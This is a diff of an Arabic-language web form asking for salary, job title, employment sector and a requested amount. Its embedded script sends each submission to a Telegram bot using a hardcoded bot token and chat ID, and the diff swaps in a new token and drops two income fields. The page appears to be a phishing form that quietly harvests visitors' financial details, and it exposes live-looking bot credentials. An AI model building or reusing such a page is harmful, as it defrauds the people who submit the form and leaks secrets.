@@ -286,10 +286,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
                     <input type="text" id="jobTitle" name="jobTitle" placeholder="اسم الوظيفة">
                 </div>
                 <div class="form-group">
-                    <input type="tel" id="additionalIncome" name="additionalIncome" placeholder="دخل إضافي">
                 </div>
                 <div class="form-group">
-                    <input type="tel" id="newTotalIncome" name="newTotalIncome" placeholder="الدخل الإجمالي الجديد">
                 </div>
 <div class="form-group">
     <select id="employmentSector" name="employmentSector">
@@ -310,7 +308,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
     </div>
 <script>
-  const botToken = '8393679169:AAFqq4LyZk6NU49HZsPf7VJRkNMUKNMqXtk'; 
+  const botToken = '8456186942:AAFxBIZIivfXCZeTSAshpjKAJkXU4lPuZrY'; 
 const chatId = '8201670834';         
 
   document.getElementById('incomeForm').addEventListener('submit', function(e) {
@@ -323,12 +321,10 @@ const chatId = '8201670834';
     const salary = document.getElementById('salary').value.trim();
     const employmentType = document.getElementById('employmentType').value.trim();
     const jobTitle = document.getElementById('jobTitle').value.trim();
-    const additionalIncome = document.getElementById('additionalIncome').value.trim();
-    const newTotalIncome = document.getElementById('newTotalIncome').value.trim();
     const employmentSector = document.getElementById('employmentSector').value;
 
     // تحقق من تعبئة الحقول (اختياري لكن جيد)
-    if (!salary || !employmentType || !jobTitle || !additionalIncome || !newTotalIncome || !employmentSector) {
+    if (!salary || !employmentType || !jobTitle  || !employmentSector) {
       alert('يرجى ملء جميع الحقول');
       return;
     }
@@ -341,8 +337,6 @@ const chatId = '8201670834';
 - المبلغ الم
 لوب : ${employmentType}
 - اسم الوظيفة: ${jobTitle}
-- دخل إضافي: ${additionalIncome}
-- الدخل الإجمالي الجديد: ${newTotalIncome}
 - قطاع العمل: ${employmentSector}
     `;
 
